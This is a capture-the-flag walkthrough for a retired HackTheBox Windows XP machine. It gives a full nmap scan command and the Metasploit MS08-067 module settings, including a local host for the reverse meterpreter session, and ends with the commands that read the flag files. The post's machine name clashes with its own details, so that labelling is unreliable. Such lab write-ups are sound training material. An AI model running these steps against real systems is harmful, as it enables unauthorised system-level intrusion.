
![](https://cdn-images-1.medium.com/max/800/1*5M6-ofIj4NRY49YkIQC38w.png)

Lame is a retired machine that is easy in difficulty and is a Windows OS. I’ll be using a virtual machine and a copy of Parrot OS, which can be downloaded from [here](https://parrotlinux.org/).

### Enumeration

I’ve started to use a new command for initial enumeration with nmap. The command must be run with elevated privileges. Using this scan should ensure that it scans relatively quickly, checks for service versions, identifies OS of the system, scans all ports, outputs to a file called legacy.txt, and uses an aggressive scan timing. The output results of the scan below.

```shell
sudo nmap -sS -sV -A -p- -oN legacy.txt -T4 10.10.10.4
```

![](https://cdn-images-1.medium.com/max/800/1*pscUvNHVhCFpPIVJntKpgQ.png)

This scan shows us that there are 2 open ports and 1 closed port. The 2 open ports are ports 139 which is netbios, and 445 which is microsoft ds. It also shows us that there is a 94% chance that the operating system is Windows XP SP3. This gives us some information to search for., so lets start by searching for windows xp sp3 netbios exploit. Within the first couple of results is an article from rapid 7 with how to exploit the machine with metasploit. Perfect.

### Exploitation

Lets fire up metasploit with msfconsole, and when it is finished loading type _use exploit/windows/smb/ms08_067_netapi  
_We then need to see what targets are available so we type show targets, and it shows a very large amount of options. Since we can assume that the os is Windows XP SP3 lets choose that option as the target. So we use the command _set target 7_ then we need to set the options for the for rhosts and lhost with `set rhosts 10.10.10.4` and `set lhost <your ip>`. Once these options have been set use the command exploit to run the exploit.

![](https://cdn-images-1.medium.com/max/800/1*yEHrmaz-GeuwmX2W-blmqQ.png)

As you can see from the screenshot using this options gave us a meterpreter session, when running getuid the command returns NT System. We should then be able to locate the user.txt as well as the root.txt files in C:\documents and settings\john\user.txt and C:\documents and settings\administrator\root.txt. Once the file has been located, typing `type user.txt` and `type root.txt` will give you the flags.